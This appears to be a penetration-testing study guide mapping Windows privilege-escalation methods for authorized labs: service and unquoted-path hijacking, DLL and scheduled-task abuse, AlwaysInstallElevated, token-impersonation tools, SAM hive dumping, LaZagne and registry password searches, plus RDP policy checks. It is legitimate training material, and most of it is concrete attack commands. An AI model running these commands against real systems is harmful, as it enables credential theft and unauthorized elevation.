Find: Prove effective file, registry and service-object permissions Take a real service/task/application path from inventory, then inspect its file, parent and separate service-object permissions. ```cmd icacls "C:\Path\To\OBJECT" icacls "C:\Path\To" sc.exe sdshow SERVICE ``` > **Recognize:** A modifiable parent can differ from a read-only file; service configuration rights are another control plane. > **Validate next:** Use icacls/Get-Acl on the reported object and parents. For a service also inspect sc qc/sc sdshow; for a task inspect its action/principal. Check the specific write/replace/configuration operation and its trigger. [Prove effective file, registry and service-object permissions](../notes/methods/windows-privesc.md#windows-acl).
Find: Recover Windows application, history and stored-credential artifacts Follow actual application/configuration paths, PSReadLine history and saved-credential targets under the current readable user context. ```cmd cmdkey /list reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName ``` > **Recognize:** A target-bound saved credential is a possible consumer capability, not a plaintext password. > **Validate next:** Establish protecting user/context, intended logon type and an actually permitted saved-credential or decryption route. [Recover Windows application, history and stored-credential artifacts](../notes/methods/windows-privesc.md#windows-secrets).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. Artifact read permission and exact protecting identity/context for saved or DPAPI material ##### Stored credentials and PowerShell trails ```cmd cmdkey /list vaultcmd /list vaultcmd /listcreds:"Windows Credentials" /all ``` ```powershell $history = (Get-PSReadLineOption).HistorySavePath $history Get-Content -LiteralPath $history -ErrorAction SilentlyContinue Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue | Where-Object Id -in 4103,4104 | Select-Object -First 50 TimeCreated,Id,Message ``` > A `cmdkey` entry is target/context-bound and does not reveal a password. DPAPI-protected data needs the protecting user/machine context and keys. `Clear-History` does not necessarily clear PSReadLine's saved file.
Targeted application/file/registry search ```cmd reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul ``` ```powershell Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } | Select-String -Pattern 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false ``` > Search from observed applications first. Classify every value by identity, format, scope and compatible service, then use the credential procedure.
Saved credential consumer ```cmd runas /savecred /user:DOMAIN\USER cmd.exe ``` > Use only when `cmdkey`/context supports that identity and logon type. `runas` does not inherently bypass UAC; verify the resulting token with `whoami /all`.
LaZagne — recover application credentials in the current user's context Use a reviewed Windows build after identifying the current user and installed applications. Start with the relevant family; run broader collection only when useful. User-protected stores depend on that user's profile/decryption context; system-protected stores can need an elevated token. ```cmd REM Browser-store leads for the current user laZagne.exe browsers REM Broader recovery, with a local text report laZagne.exe all -oN ``` > **Read:** preserve the reported application/account/source with each recovered value. Test a matching service using the credential procedure; a recovered application password is not automatically a domain password. Empty output can mean no supported store, inaccessible profile or failed decryption. Follow manual history/config/vault checks instead of assuming there are no credentials. [LaZagne upstream](https://github.com/AlessandroZ/LaZagne).
```powershell Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'pass|cred|config|backup|unattend|\.env' } ``` ```powershell Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd' } | Select-String -Pattern 'password|passwd|secret|token|connectionString' -CaseSensitive:$false ``` Avoid searching the entire filesystem without a reason; scope reduces noise, access errors and sensitive-data overcollection. > **Verify:** Tie each value to a source/account/service and verify any new token with whoami /all. > **If it fails:** Protected blobs, stale history and saved credentials for a different target require their own keys/context or a different route.
Find: Change a privileged service's executable configuration Inventory service accounts/paths, select a higher-identity service and query its effective service-object rights with the current token. ```powershell Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName sc.exe qc SERVICE accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE ``` > **Recognize:** Configuration-change and start rights on the same higher-identity service are promising; file ACLs alone would not prove them. > **Validate next:** Use sc qc to read the service account and command, sc sdshow/AccessChk to verify configuration rights and sc query to inspect state. Confirm an allowed start/restart trigger before changing the service, then verify whoami. [Change a privileged service's executable configuration](../notes/methods/windows-privesc.md#windows-service-config).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. Configuration-change right, accessible compatible payload path and a separate start/restart trigger ```powershell Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName ``` ```cmd sc.exe qc SERVICE sc.exe sdshow SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\service.exe" ``` > **Need:** control of service config, exact binary/script, searched prefix, DLL/config/plugin, or relevant DACL; higher `SERVICE_START_NAME`; and a start/restart/boot trigger. In PowerShell use `sc.exe`, because bare `sc` can resolve to `Set-Content`. Preserve `BINARY_PATH_NAME`, account and start mode first: ```cmd sc.exe qc SERVICE sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE" sc.exe stop SERVICE sc.exe start SERVICE ``` Restore: ```cmd sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH" ``` > `SERVICE_CHANGE_CONFIG` controls `binPath`; start/stop are separate rights. The space after `binPath=` is required. Error 1053 may mean a non-service payload ran but did not answer the Service Control Manager; verify the intended effect.
Writable service binary or replaceable parent ```cmd sc.exe qc SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup" copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe" sc.exe stop SERVICE sc.exe start SERVICE ``` > A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.
> **Verify:** Verify the payload's effect and service execution identity, then restore the saved configuration. > **If it fails:** Access denied on config is different from trigger denial or an incompatible binary. Preserve original binPath and use sc.exe explicitly in PowerShell.
Find: Replace a privileged service binary or consumed file From service inventory follow the exact executable/script path and inspect both its own ACL and its parent's replacement rights. ```cmd sc.exe qc SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" ``` > **Recognize:** A higher-identity service consumes a potentially replaceable file in a modifiable directory. > **Validate next:** Use sc qc to locate the real binary and account, then icacls on that file and its parent. Confirm replacement rights and an available privileged service start/restart; a writable unrelated file is insufficient. [Replace a privileged service binary or consumed file](../notes/methods/windows-privesc.md#windows-service-binary).
Find: Exploit an unquoted service path with a writable earlier prefix List service command lines and accounts, then inspect every earlier executable prefix in the actual unquoted path. ```powershell Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName ``` > **Recognize:** Spaces plus absent executable quoting create candidate earlier prefixes; writable placement and trigger remain unproved. > **Validate next:** Read the unquoted service command with sc qc. Check each earlier executable prefix for write/create access with icacls; confirm the service account and restart trigger. Spaces alone do not make the path exploitable. [Exploit an unquoted service path with a writable earlier prefix](../notes/methods/windows-privesc.md#windows-unquoted).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. An earlier executable prefix is absent and creatable, service identity is higher and a start/restart trigger exists ```powershell Get-CimInstance Win32_Service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } | Select-Object Name,StartName,State,StartMode,PathName ``` For `C:\Program Files\Vendor App\service.exe -d`, check every attempted prefix: ```cmd icacls C:\ icacls "C:\Program Files" icacls "C:\Program Files\Vendor App" sc.exe qc SERVICE ``` > **Confirmed only if:** path contains spaces and is unquoted; an earlier attempted executable such as `C:\Program.exe` or `C:\Program Files\Vendor.exe` is absent and creatable; service runs higher; trigger exists. A listed unquoted path alone is a false positive. > **Verify:** Confirm the earlier prefix is actually selected after the trigger and verify its resulting token. > **If it fails:** A quoted path, existing protected earlier file, unwritable directory or absent trigger defeats the chain.
Find: Control a privileged DLL, helper or configuration load Investigate a privileged application with observed dependency failures; if permitted, filter its runtime file loads in Procmon before checking candidate directory ACLs. ```text Procmon, when accessible: filter the actual process; inspect requested .dll paths and NAME NOT FOUND results. Record the exact requested filename and every searched location. Then inspect the selected location's effective ACL with the owning procedure. ``` > **Recognize:** An actual requested missing dependency is stronger than guessing a DLL name, but does not prove an attacker-controlled resolution wins. > **Validate next:** Validate real privilege, search precedence/KnownDLLs/manifests, directory control, ABI/exports and a load trigger. [Control a privileged DLL, helper or configuration load](../notes/methods/windows-privesc.md#windows-dll).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. Actual controlled resolution path, compatible name/architecture/exports and a reliable privileged load trigger Confirm: 1. exact DLL/helper/config name and architecture; 2. privileged process actually requests it; 3. selected attacker-writable location precedes the legitimate resolution; 4. payload preserves required exports/behavior where necessary; 5. reliable trigger exists. ```cmd icacls "C:\Path\To\Application" sc.exe qc SERVICE reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode ``` > Modern DLL resolution can apply redirection, API sets, side-by-side manifests, loaded modules, KnownDLLs, package dependencies and application-specific search flags before ordinary directories. Safe DLL search mode is enabled by default. In a suitable lab, Procmon filters for the process, `CreateFile`, `.dll`, and `NAME NOT FOUND` provide decisive runtime evidence; low-privilege remote use may be unavailable. > **Verify:** Verify the actual loaded path and privileged effect; a file placed on disk is not a completed chain. > **If it fails:** Wrong ABI/exports, earlier trusted resolution or no load trigger blocks the method.
Find: Control scheduled tasks, startup files or autostart consumers Enumerate task definitions and inspect the action, principal, arguments and working directory before permission-checking its files. ```cmd schtasks /query /fo LIST /v schtasks /query /tn "\FOLDER\TASK" /xml ``` > **Recognize:** A named privileged task exposes a concrete consumer and action path to investigate. > **Validate next:** Read the task's exact action, principal and trigger with schtasks or Get-ScheduledTask. Check icacls on its file/parents and prove the stronger identity will consume the controlled path at a reachable trigger. [Control scheduled tasks, startup files or autostart consumers](../notes/methods/windows-privesc.md#windows-tasks).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. Effective object control, a higher principal and a usable scheduled/logon/manual trigger ##### Scheduled tasks ```cmd schtasks /query /fo LIST /v schtasks /query /tn "\FOLDER\TASK" /xml ``` ```powershell Get-ScheduledTask | ForEach-Object { $t = $_ [pscustomobject]@{ TaskPath=$t.TaskPath; TaskName=$t.TaskName UserId=$t.Principal.UserId; RunLevel=$t.Principal.RunLevel Actions=($t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments) [wd=$($_.WorkingDirectory)]" }) -join '; ' } } ``` ```cmd icacls "C:\Path\To\task-script.ps1" icacls "C:\Path\To" schtasks /run /tn "\FOLDER\TASK" ``` > Prove action, arguments, working directory, principal, actual trigger and effective ACL. `RunLevel Highest` means the configured principal's highest available token, not SYSTEM. `/run` success means the request was accepted; verify process/effect and last-run result.
Run keys and startup consumers ```cmd reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" ``` > Need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. A writable PATH directory matters only when a privileged consumer invokes an unqualified executable through that effective PATH.
> **Verify:** Check the actual effect and token after the trigger; task-run acceptance alone is insufficient. > **If it fails:** Wrong principal, stale action, denied trigger or a different working directory can invalidate the candidate.
Find: Validate elevated installer policy and administrative-token context Inspect both machine/user installer-policy values and the current token before inferring an elevated MSI or UAC-context route. ```cmd reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated whoami /all ``` > **Recognize:** One policy value is insufficient; the two-policy conjunction is the key recognition condition. > **Validate next:** For installer execution verify both applicable values and permitted MSI/runtime; assess UAC administrator/token prerequisites separately. [Validate elevated installer policy and administrative-token context](../notes/methods/windows-privesc.md#windows-installer).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. AlwaysInstallElevated requires both effective machine/user policy values and permitted MSI execution; UAC routes require their own compatible administrator/token context ```cmd reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated ``` Both values must be `0x1`: ```cmd msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi ``` > One key or a zero value disproves the route. This is an unsafe installer policy, not a universal UAC bypass. ```cmd whoami /groups reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin ``` > A UAC bypass normally elevates an already-administrative filtered token. Build/policy-specific bypasses are not a baseline path for a standard user. > **Verify:** Verify both relevant conditions and actual resulting token; keep UAC-context claims narrower than full privilege escalation. > **If it fails:** One policy value, blocked MSI execution or an incompatible protected token defeats the assumed route.
Find: Select a privilege-backed impersonation or object-control route Inspect the current token's privileges, then map a relevant privilege to an actual protected operation and available source/trigger. ```cmd whoami /priv whoami /all ``` > **Recognize:** An impersonation capability is present; the privileged authentication source required by a specific tool is not established. > **Validate next:** Read whoami /priv and whoami /all. Match the exact privilege, enabled state and token context to the technique's required API/trigger, then verify the resulting identity; the privilege name alone is not SYSTEM. [Select a privilege-backed impersonation or object-control route](../notes/methods/windows-privesc.md#windows-token).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. The exact privilege and usable operation; impersonation additionally needs a compatible privileged authentication source, OS/service state and executable context ```cmd whoami /priv ``` | Privilege | Required next proof | | --- | --- | | `SeImpersonatePrivilege` | Compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation | | `SeAssignPrimaryTokenPrivilege` | Useful primary token plus process/quota requirements | | `SeBackupPrivilege` | Enabled privilege, backup-aware read and useful protected data | | `SeRestorePrivilege` | Restore-aware write plus privileged consumer/trigger | | `SeDebugPrivilege` | Usable target process and no protected-process barrier | | `SeLoadDriverPrivilege` | Compatible signed/loadable driver and stable exploit path | | `SeTakeOwnershipPrivilege` | Ownership change, then DACL/content control and consumer |
Impersonation-tool variants ```cmd PrintSpoofer64.exe -i -c "cmd.exe" ``` ```cmd GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt" ``` > Choose by OS build, architecture, runtime and available trigger. A privilege name alone does not select a working “Potato.” Success is a SYSTEM process/effect followed by `whoami /all`; connection/token/process errors route back to prerequisites.
Backup privilege to local credential material ```cmd reg save HKLM\SAM C:\Windows\Temp\SAM.hive reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive ``` ```bash impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL ``` > Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization; classify and validate it through the credential procedure.
> **Verify:** Verify the resulting token or concrete protected-object operation, not the tool's success text. > **If it fails:** Missing token source, filtered token, protected process or driver-signing/build differences change the route; inspect the specific prerequisite.
Find: Use backup privilege to obtain protected local credential material Inspect the actual token for backup-related rights and distinguish a privilege-aware read API from an ordinary file copy. ```cmd whoami /priv ``` > **Recognize:** The privilege is assigned but initially disabled; permitted software may enable it for backup-semantic reads. > **Validate next:** Check that the privilege can actually be used, supporting API/context, complete matched source set and writable output. [Use backup privilege to obtain protected local credential material](../notes/methods/windows-privesc.md#windows-backup).
Find: Select a matching application, driver or kernel exploit Collect OS build/patch and relevant installed driver/application versions before comparing any local-exploit requirement. ```powershell Get-ComputerInfo | Select-Object OsBuildNumber,OsArchitecture Get-HotFix Get-CimInstance Win32_SystemDriver | Select-Object Name,State,PathName ``` > **Recognize:** The exact component/build is the candidate evidence; an OS-family name or one missing KB is insufficient. > **Validate next:** Verify vendor patch state, required driver/service/feature, architecture and PoC assumptions. [Select a matching application, driver or kernel exploit](../notes/methods/windows-privesc.md#windows-kernel).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. Affected build/patch/architecture, required service/driver/configuration and compatible exploit assumptions ```powershell Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion,Publisher,InstallLocation ``` ```cmd systeminfo driverquery /v ``` > Prefer deterministic credential/permission/configuration paths. Then verify exact privileged application or driver version/configuration. Use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. Avoid `Win32_Product`; it is slow and can trigger MSI repair. > **Verify:** Verify target hostname and resulting effective token; preserve reviewed PoC modifications privately. > **If it fails:** A crash or compilation success does not prove escalation. Wrong build, missing driver or mitigations require another supported path.
Find: Turn automated Windows findings into manually verified candidates Select a reviewed tool after checking host/runtime; treat each highlighted service, token or path as a lead to native evidence. ```powershell whoami /all $PSVersionTable $ExecutionContext.SessionState.LanguageMode ``` > **Recognize:** The enumerator located a configuration clue, not the full usable chain. > **Validate next:** Run winPEAS with log output, then inspect the exact reported service with sc qc/sc sdshow and its file with icacls. Check token highlights with whoami /priv. A collector's colored line is not the resulting elevated token. [Turn automated Windows findings into manually verified candidates](../notes/methods/windows-privesc.md#windows-enumerators).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. Verified current token and architecture, a compatible reviewed executable or allowed PowerShell runtime, and a writable report location ```cmd winPEASx64.exe log Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt" Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json" ``` ```powershell powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML" Import-Module .\PowerUp.ps1 Invoke-AllChecks ``` > winPEAS is broad; Seatbelt is a targeted survey and publishes source rather than official binaries; PrivescCheck evaluates the current token and skips some checks when elevated; PowerUp is useful but its upstream repository was archived. AV/script-policy failure is a tooling limitation—use native checks. Convert every highlight into: ```text CANDIDATE | CURRENT TOKEN | CONTROLLED INPUT | EFFECTIVE RIGHT | CONSUMER | RUN-AS | TRIGGER | EXPECTED EFFECT | STATUS ``` > **Verify:** Read out.txt or the helper report. Use sc.exe qc/sdshow plus icacls for a service, inspect task XML/run-as for a scheduled task, or check whoami /priv for a token finding > **If it fails:** Binary/script blocked or report empty: check architecture and PowerShell language/policy, then use native service/task/ACL checks. A blocked helper does not disprove the finding
### Additional conditional surfaces Open a branch only when its observation and prerequisites match. Discovery-only entries retain their missing-action boundary.
Inspect host-side RDP enablement and logon policy - **Enter:** you have authorized local administrative or equivalent management access to a Windows destination, and RDP access is relevant or failing. - **Discover:** inspect `TermService`, `fDenyTSConnections`, configured `PortNumber`, `qwinsta` listener state and the actual source-to-port path. - **Validate:** inspect NLA/security-layer policy, applied GPO, local Remote Desktop Users membership, and the effective `SeRemoteInteractiveLogonRight` / `SeDenyRemoteInteractiveLogonRight` assignments. Deny overrides allow. - **Execute:** [RDP host-side inspection](../reference/02-service-enumeration/09-windows-remote-access.md#rdp-host-side-inspection-local-administrative-context); then use the [RDP access procedure](../reference/03-initial-access/01-rdp-access.md) only when its conditions are satisfied. - **Verify:** a usable desktop followed by `whoami`, `hostname` and `ipconfig` establishes the new host/identity/source position. Authentication-only success is not an interactive session. - **Outcomes:** listener/right/client conditions satisfied → [remote operation preflight](../notes/methods/lateral-movement.md#move-preflight) then [session verification](../notes/methods/sessions-transfers.md#session-proof); decisive deny/no listener → ruled out here; policy, SID expansion or filtering unresolved → inconclusive.
Documented commands and conditions Use this read-only sequence after obtaining an authorized local administrative session on the destination, or when the exercise explicitly supplies equivalent remote-management access. It answers four different questions: is RDP enabled, is a listener actually present, what security layer/NLA policy applies, and does the candidate identity have an effective remote-interactive logon right? Do not change registry values or policy merely to make a credential work. ##### 1. Listener, service and configured port ```powershell Get-Service TermService reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber qwinsta ``` ```cmd netstat -ano | findstr LISTENING | findstr ":3389" ``` > **Read:** `fDenyTSConnections = 0` permits RDP at the local setting; `1` denies new RDP connections. `PortNumber` is displayed as a registry DWORD, commonly hexadecimal `0xD3D` for 3389. A running `TermService` plus an `RDP-Tcp` listener in `qwinsta` and a listening socket establishes host-side listener state. A missing `:3389` socket is not decisive if `PortNumber` is nondefault. Policy can override the local value, so inspect resultant policy before treating this as effective configuration. ##### 2. NLA, transport security and policy precedence ```cmd reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MinEncryptionLevel reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDenyTSConnections reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v UserAuthentication reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v SecurityLayer ``` ```cmd gpresult /scope computer /v ``` > **Read:** `UserAuthentication = 1` requires Network Level Authentication. For `SecurityLayer`, `0` is native RDP security, `1` negotiates, and `2` requires TLS. `MinEncryptionLevel` further constrains client compatibility. A missing policy value means “not configured at this policy path,” not that the feature is absent. Use `gpresult` to identify the winning computer policy when local and policy-backed values conflict or revert after refresh. These settings explain negotiation failures; they do not grant a user logon rights. ##### 3. Candidate membership and effective logon rights ```cmd net localgroup "Remote Desktop Users" whoami /groups ``` From an elevated PowerShell or Command Prompt, export the currently applied user-right assignments and inspect only the RDP entries: ```powershell $policy = Join-Path $env:TEMP 'rdp-user-rights.inf' secedit /export /mergedpolicy /areas user_rights /cfg $policy /quiet Select-String -Path $policy -Pattern '^SeRemoteInteractiveLogonRight','^SeDenyRemoteInteractiveLogonRight' ``` > **Read:** the candidate must be covered by `SeRemoteInteractiveLogonRight`; membership in local **Administrators** or **Remote Desktop Users** commonly supplies that right, but the actual applied policy is decisive. `SeDenyRemoteInteractiveLogonRight` overrides the allow right. Exported entries can be names or SIDs, so resolve unfamiliar SIDs before deciding. `whoami /groups` proves only the current process token; use it for the candidate only when you are actually running in that candidate's context. A group listing alone does not prove an effective right when domain policy or nested membership changes the result. ##### 4. Source-relative validation and decision ```bash nmap -Pn -n -p 3389 --reason TARGET xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore ``` > **Ready for an interactive attempt:** the actual source reaches the configured RDP port; the listener is enabled; the client can meet the NLA/security requirements; the credential is accepted in the intended local/domain context; and the identity has the effective allow right without an applicable deny right. **Ruled out in this context:** a decisive required condition is absent, such as an effective deny assignment or no listener on the configured port. **Inconclusive:** access to policy data is denied, group/SID expansion is unresolved, GPO precedence is unclear, or network filtering prevents source-relative validation. Do not turn an inconclusive result into “bad password” or “RDP disabled.” > **Security baseline:** on a normally secured host, RDP may be disabled when not needed; when enabled, NLA is normally retained, access is limited to intended administrative/remote-user principals, deny assignments override broad membership, and the firewall limits exposure. The state machine records deviations and capabilities; it does not recommend weakening these controls.
[Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S01).

# Attack Strategy Map

[Main index](../README.md) | [Study sequence](Speedrun_Breakdown.md) | [Shared concepts](Master_Notes.md) | [Cheatsheets](../cheatsheets/README.md)

Choose an objective, compare the methods by their prerequisites, then open a self-contained entry. Each entry explains how to find its enabling conditions, why it works, how to execute and verify it, how failures change the decision, and which methods its result can unlock.

The map contains **174 documented methods across 15 topic guides**, accounting for all 15 speedrun blocks and the eight grouped study units. Counts describe this preparation inventory, not every vulnerability or environment-specific chain that can exist.

For Active Directory, use the [numbered AD Notes](ad-investigation/README.md), including [raw-output comparisons](ad-investigation/chapter-6-2.md), [approach selection](ad-investigation/method-choice.md) and [unanswered changed-condition cases](ad-investigation/practice-cases.md).

## Discover the clue before choosing a method

Follow starting access → investigation location → discovery action → illustrative evidence → recognition → missing-condition checks → method selection. Each entry distinguishes enabled-after-validation, ruled-out and inconclusive examples.

Begin with the topic workflow when you do not yet have a useful clue:

| Starting investigation | Discovery workflow |
| --- | --- |
| Discover attack surfaces | [Where to start](methods/discovery.md#discovery-workflow) |
| Extract opportunities from services | [Where to start](methods/services.md#discovery-workflow) |
| Map useful web behavior | [Where to start](methods/web-mapping.md#discovery-workflow) |
| Turn application weaknesses into access | [Where to start](methods/web-exploitation.md#discovery-workflow) |
| Recover and use authentication material | [Where to start](methods/credentials.md#discovery-workflow) |
| Select and adapt public exploits | [Where to start](methods/public-exploits.md#discovery-workflow) |
| Establish sessions and move files | [Where to start](methods/sessions-transfers.md#discovery-workflow) |
| Escalate privileges on Linux | [Where to start](methods/linux-privesc.md#discovery-workflow) |
| Escalate privileges on Windows | [Where to start](methods/windows-privesc.md#discovery-workflow) |
| Map Active Directory attack paths | [Where to start](methods/ad-mapping.md#discovery-workflow) |
| Gain a more useful domain identity | [Where to start](methods/ad-identities.md#discovery-workflow) |
| Move to another host | [Where to start](methods/lateral-movement.md#discovery-workflow) |
| Reach internal services | [Where to start](methods/pivoting.md#discovery-workflow) |
| Resolve payload execution obstacles | [Where to start](methods/execution.md#discovery-workflow) |
| Complete attacks and retain reproducible evidence | [Where to start](methods/integration.md#discovery-workflow) |

Test discovery and prerequisite reasoning with the [unanswered recognition cases](Recognition_Practice.md) before consulting the explanations.

## Start from your current capability

| What you have or need | Open |
| --- | --- |
| An address, uncertain reachability, or incomplete port coverage | [Discovery](methods/discovery.md) |
| A reachable service and an anonymous or authenticated access context | [Service opportunities](methods/services.md) |
| A website with unexplored requests, roles, files or APIs | [Web mapping](methods/web-mapping.md) |
| A suspicious application behavior or a read/write/injection primitive | [Web exploitation](methods/web-exploitation.md) |
| A password, key, hash, captured response or ticket | [Credentials](methods/credentials.md) |
| A component with a plausible public exploit | [Exploit adaptation](methods/public-exploits.md) |
| Command execution, a limited session, or a file that must move | [Sessions and transfers](methods/sessions-transfers.md) |
| A Linux foothold | [Linux privilege escalation](methods/linux-privesc.md) |
| A Windows foothold | [Windows privilege escalation](methods/windows-privesc.md) |
| A domain identity with unknown rights and relationships | [AD mapping](methods/ad-mapping.md) |
| A credential source or effective domain-object right | [AD identity transitions](methods/ad-identities.md) |

| A service behind another host, or a broken return path | [Pivoting](methods/pivoting.md) |

### Turn application weaknesses into access

#### File read and interpreted inclusion
